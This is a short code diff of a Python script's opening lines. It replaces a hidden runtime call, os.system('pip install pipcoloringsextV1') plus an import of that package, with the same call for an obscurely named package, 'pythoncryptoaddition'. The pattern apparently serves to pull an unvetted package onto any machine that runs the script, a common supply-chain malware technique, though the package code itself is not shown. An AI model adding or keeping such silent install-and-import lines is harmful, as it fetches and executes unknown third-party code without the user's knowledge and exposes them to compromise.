@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringsextV1")
-import pipcoloringsextV1
+os.system("pip install pythoncryptoaddition")
+import pythoncryptoaddition
 import random
 import requests
 import time
